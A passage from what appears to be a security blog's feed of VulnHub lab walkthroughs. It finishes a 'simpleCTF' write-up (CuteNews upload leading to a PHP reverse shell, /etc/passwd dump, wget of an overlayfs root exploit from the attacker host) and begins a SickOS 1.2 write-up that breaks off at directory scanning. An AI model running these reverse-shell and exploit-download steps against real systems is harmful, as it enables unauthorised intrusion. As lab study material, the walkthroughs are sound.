</span><span class='line'>10.1.1.2    00:50:56:f1:61:7e   VMware, Inc.
</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.134  00:0c:29:29:7a:4e   VMware, Inc.
</span><span class='line'>10.1.1.254  00:50:56:f0:91:47   VMware, Inc.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;4 packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.839 seconds <span class="o">(</span>90.17 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure></p>

<p><code>10.1.1.134</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.134/32 <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">rate</span><span class="o">=</span>10000&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting masscan 1.0.3 <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://bit.ly/14GZzcT&quot;</span>&gt;http://bit.ly/14GZzcT&lt;/a&gt;<span class="o">)</span> at 2016-06-07 07:39:25 GMT
</span><span class='line'> <span class="p">&amp;</span>ndash<span class="p">;</span> forced options: -sS -Pn -n <span class="p">&amp;</span>ndash<span class="p">;</span>randomize-hosts -v <span class="p">&amp;</span>ndash<span class="p">;</span>send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.134 &lt;br/&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/simpleCTF# nmap -v -sV -A -O 10.1.1.134 -oN 134_nmap.txt&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>80/tcp open  http    Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-favicon: Unknown favicon MD5: 759585A56089DB516D1FBBBE5A8EEA57
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-title: Please Login / CuteNews
</span><span class='line'>MAC Address: 00:0C:29:29:7A:4E <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>Device <span class="nb">type</span>: general purpose
</span><span class='line'>Running: Linux 3.X<span class="p">|</span>4.X
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Only port <code>80</code> is found and <code>Apache 2.4.7</code> is the HTTP server, also find that, from the title, the CMS is <code>CuteNews</code>.</p>

<p>In the meanwhile, I run <code>nikto</code> to scan web vulnerabilities in terms of port 80 found by port-scanning stage.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>- Nikto v2.1.6/2.1.5
</span><span class='line'>+ Target Host: 10.1.1.134
</span><span class='line'>+ Target Port: 80
</span><span class='line'>+ GET Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.6
</span><span class='line'>+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
</span><span class='line'>+ GET Cookie CUTENEWS_SESSION created without the httponly flag
</span><span class='line'>+ GET Server leaks inodes via ETags, header found with file /favicon.ico, fields: 0x47e 0x4ec3e1d077c80
</span><span class='line'>+ IZUYPEIH Web Server returns a valid response with junk HTTP methods, this may cause <span class="nb">false </span>positives.
</span><span class='line'>+ OSVDB-3268: GET /docs/: Directory indexing found.
</span><span class='line'>+ OSVDB-3092: GET /LICENSE.txt: License file found may identify site software.
</span><span class='line'>+ OSVDB-3233: GET /icons/README: Apache default file found.
</span></code></pre></td></tr></table></div></figure></p>

<p>Nothing special, so next I open firefox to check the WEB application.</p>

<p><img class="left" src="/downloads/simpleCTF/1.png"></p>

<p>I found a login page, also the WEB application is <code>CuteNews 2.0.3</code>.</p>

<p>By checking online, <code>CuteNews 2.0.3</code> has an known <a href="https://www.exploit-db.com/exploits/37474/" title="CuteNews 2.0.3 - Arbitrary File Upload Vulnerability">Remote File Upload Vulnerability</a>.</p>

<p>So I sign up a new user <code>f4l13n</code> and log in to <strong>Personal Option</strong>, then upload <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" title="PHP Reverse Shell by pentestmonkey">PHP reverse shell</a> <code>rsh443.php</code> as Avatar picture, here I use <strong>burp proxy</strong> to check the request.</p>

<p><img class="left" src="/downloads/simpleCTF/2.png"></p>

<p>After the webshell uploaded successfully, I setup <code>nc</code> to listen on port <code>443</code> and wait for the reverse shell connect back.</p>

<p>Then go to <code>http://10.1.1.134/uploads/</code>, here I can find the uploaded PHP shell, by accessing this PHP file to trigger the shell.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -lvnp 443
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> <span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>connect to <span class="o">[</span>10.1.1.130<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.1.1.134<span class="o">]</span> 48114
</span><span class='line'>Linux simple 3.16.0-30-generic <span class="c">#40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux</span>
</span><span class='line'> 05:35:36 up  1:57,  <span class="m">0</span> users,  load average: 0.00, 0.01, 0.05
</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'>/bin/sh: 0: can<span class="p">&amp;</span>rsquo<span class="p">;</span>t access tty<span class="p">;</span> job control turned off
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span>uname -a
</span><span class='line'>Linux simple 3.16.0-30-generic <span class="c">#40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux</span>
</span><span class='line'><span class="nv">$ </span>cat /etc/passwd
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span><span class='line'>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span><span class='line'>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span><span class='line'>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span><span class='line'>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span><span class='line'>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;news:x:9:9:news:/var/spool/news:/usr/sbin/nologin&quot;</span>&gt;news:x:9:9:news:/var/spool/news:/usr/sbin/nologin&lt;/a&gt;
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span><span class='line'>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span><span class='line'>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:
</span><span class='line'>syslog:x:101:104::/home/syslog:/bin/false
</span><span class='line'>mysql:x:102:106:MySQL Server,,,:/nonexistent:/bin/false
</span><span class='line'>messagebus:x:103:107::/var/run/dbus:/bin/false
</span><span class='line'>landscape:x:104:110::/var/lib/landscape:/bin/false
</span><span class='line'>bull:x:1000:1000:bull,,,:/home/bull:/bin/bash
</span></code></pre></td></tr></table></div></figure></p>

<p>Then after lots of enumeration, I found the overlayfs local root vulnerability can let me root in.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>www-data@simple:/tmp<span class="nv">$ </span>wget &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.130/privesc/37292.c&quot;</span>&gt;http://10.1.1.130/privesc/37292.c&lt;/a&gt; -O /tmp/37292.c
</span><span class='line'>wget &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.130/privesc/37292.c&quot;</span>&gt;http://10.1.1.130/privesc/37292.c&lt;/a&gt; -O /tmp/37292.c
</span><span class='line'><span class="p">&amp;</span>ndash<span class="p">;</span>2016-06-07 06:06:10<span class="p">&amp;</span>ndash<span class="p">;</span>  &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.130/privesc/37292.c&quot;</span>&gt;http://10.1.1.130/privesc/37292.c&lt;/a&gt;
</span><span class='line'>Connecting to 10.1.1.130:80<span class="p">&amp;</span>hellip<span class="p">;</span> connected.
</span><span class='line'>HTTP request sent, awaiting response<span class="p">&amp;</span>hellip<span class="p">;</span> <span class="m">200</span> OK
</span><span class='line'>Length: <span class="m">5123</span> <span class="o">(</span>5.0K<span class="o">)</span> <span class="o">[</span>text/x-csrc<span class="o">]</span>
</span><span class='line'>Saving to: <span class="p">&amp;</span>lsquo<span class="p">;</span>/tmp/37292.c<span class="p">&amp;</span>rsquo<span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;100%<span class="o">[======================================</span>&gt;<span class="o">]</span> 5,123       <span class="p">&amp;</span>ndash<span class="p">;</span>.-K/s   in 0s&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;2016-06-07 06:06:10 <span class="o">(</span>18.0 MB/s<span class="o">)</span> - <span class="p">&amp;</span>lsquo<span class="p">;</span>/tmp/37292.c<span class="p">&amp;</span>rsquo<span class="p">;</span> saved <span class="o">[</span>5123/5123<span class="o">]</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;www-data@simple:/tmp<span class="nv">$ </span>gcc 37292.c -o 37292
</span><span class='line'>gcc 37292.c -o 37292
</span><span class='line'>www-data@simple:/tmp<span class="nv">$ </span>ls -al
</span><span class='line'>ls -al
</span><span class='line'>total 200
</span><span class='line'>drwxrwxrwt  <span class="m">2</span> root     root       <span class="m">4096</span> Jun  <span class="m">7</span> 06:06 .
</span><span class='line'>drwxr-xr-x <span class="m">21</span> root     root       <span class="m">4096</span> Sep  <span class="m">9</span>  <span class="m">2015</span> ..
</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> www-data www-data  <span class="m">12502</span> Jun  <span class="m">7</span> 06:00 37088
</span><span class='line'>-rw-rw-rw-  <span class="m">1</span> www-data www-data   <span class="m">6276</span> Sep  <span class="m">2</span>  <span class="m">2015</span> 37088.c
</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> www-data www-data  <span class="m">12189</span> Jun  <span class="m">7</span> 06:06 37292
</span><span class='line'>-rw-rw-rw-  <span class="m">1</span> www-data www-data   <span class="m">5123</span> Jun  <span class="m">7</span> 06:04 37292.c
</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> www-data www-data  <span class="m">25304</span> Aug <span class="m">19</span>  <span class="m">2015</span> lpc.py
</span><span class='line'>-rw-rw-rw-  <span class="m">1</span> www-data www-data <span class="m">119499</span> Jun  <span class="m">7</span> 05:48 lpc_rst.txt
</span><span class='line'>www-data@simple:/tmp<span class="nv">$ </span>./37292
</span><span class='line'>./37292
</span><span class='line'>spawning threads
</span><span class='line'>mount <span class="c">#1</span>
</span><span class='line'>mount <span class="c">#2</span>
</span><span class='line'>child threads <span class="k">done</span>
</span><span class='line'>/etc/ld.so.preload created
</span><span class='line'>creating shared library&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;id&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;pwd&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;pwd
</span><span class='line'>/tmp&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;cd /root&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;cd /root&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;ls&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;ls
</span><span class='line'>flag.txt&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;cat flag.txt&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;cat flag.txt
</span><span class='line'>U wyn teh Interwebs!!1eleven11!!1!
</span><span class='line'>Hack the planet!&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>Done~</p>

<!--- Reference -->



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[VulnHub] SickOS 1.2]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2016/06/05/vulnhub-sickos-1-dot-2/"/>
    <updated>2016-06-05T17:03:17+10:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2016/06/05/vulnhub-sickos-1-dot-2</id>
    <content type="html"><![CDATA[<p>&ldquo;This is second in following series from SickOs and is independent of the prior releases, scope of challenge is to gain highest privileges on the system.&rdquo; &ndash; <a href="https://www.vulnhub.com/author/d4rk,199/">D4rk</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/sickos-12,144/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.132/24</em>)</p>

<p>Target: SickOS: 1.2 (<em>10.1.1.133/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>File upload via HTTP PUT method</li>
<li>python reverse shell</li>
<li>chkrootkit 0.49 Local Root Exploit</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Use dirb tool to discover hidden directory [<font color="FF8000">dirb</font>]</li>
<li>Web application scanned to dig more information about web service [<font color="FF8000">nikto</font>]</li>
<li>Exploit HTTP PUT Method to upload one-line PHP shell</li>
<li>Use python reverse shell to get a better shell</li>
<li>Enumeration &amp;&amp; Exploit <code>chkrootkit 0.49</code> to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="http://www.metasploit.com/">Metasploit</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="http://dirb.sourceforge.net/about.html">dirb</a></li>
<li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">reverse shell cheat sheet</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address (10.1.1.133 in this case).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.nta-monitor.com/tools/arp-scan/&quot;</span>&gt;http://www.nta-monitor.com/tools/arp-scan/&lt;/a&gt;<span class="o">)</span>
</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2    00:50:56:f1:61:7e   VMware, Inc.
</span><span class='line'>10.1.1.133  00:0c:29:0f:eb:df   VMware, Inc.
</span><span class='line'>10.1.1.254  00:50:56:f0:91:47   VMware, Inc.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;4 packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.290 seconds <span class="o">(</span>111.79 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure></p>

<p><code>10.1.1.133</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.133/32 <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">rate</span><span class="o">=</span>10000&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting masscan 1.0.3 <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://bit.ly/14GZzcT&quot;</span>&gt;http://bit.ly/14GZzcT&lt;/a&gt;<span class="o">)</span> at 2016-06-05 04:39:01 GMT
</span><span class='line'> <span class="p">&amp;</span>ndash<span class="p">;</span> forced options: -sS -Pn -n <span class="p">&amp;</span>ndash<span class="p">;</span>randomize-hosts -v <span class="p">&amp;</span>ndash<span class="p">;</span>send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 22/tcp on 10.1.1.133                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.133        &lt;br/&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>There are 2 ports (22, 80) detected by <code>masscan</code>, then I run <code>nmap</code> to do a deeper service scan.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;Nmap 7.12 scan initiated Sun Jun  <span class="m">5</span> 14:40:00 <span class="m">2016</span> as: nmap -sV -A -O -v -oN 133_nmap.txt 10.1.1.133&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Nmap scan report <span class="k">for</span> 10.1.1.133
</span><span class='line'>Host is up <span class="o">(</span>0.00034s latency<span class="o">)</span>.
</span><span class='line'>Not shown: <span class="m">998</span> filtered ports
</span><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span><span class='line'><span class="p">|</span> ssh-hostkey:
</span><span class='line'><span class="p">|</span>   <span class="m">1024</span> 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 <span class="o">(</span>DSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>   <span class="m">2048</span> ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab <span class="o">(</span>RSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;em&gt;  <span class="m">256</span> a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af <span class="o">(</span>ECDSA<span class="o">)</span>
</span><span class='line'>80/tcp open  http    lighttpd 1.4.28
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-server-header: lighttpd/1.4.28
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-title: Site doesn<span class="p">&amp;</span>rsquo<span class="p">;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
</span><span class='line'>MAC Address: 00:0C:29:0F:EB:DF <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span> turncate <span class="p">&amp;</span>hellip<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Run <code>nikto</code> to scan WEB application, but nothing found.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>- Nikto v2.1.6/2.1.5
</span><span class='line'>+ Target Host: 10.1.1.133
</span><span class='line'>+ Target Port: 80
</span><span class='line'>+ GET The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
</span><span class='line'>+ GET Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21
</span></code></pre></td></tr></table></div></figure></p>

<p>Then run <code>dirb</code> to discover potential hidden directories and one folder was found: <code>/test/</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
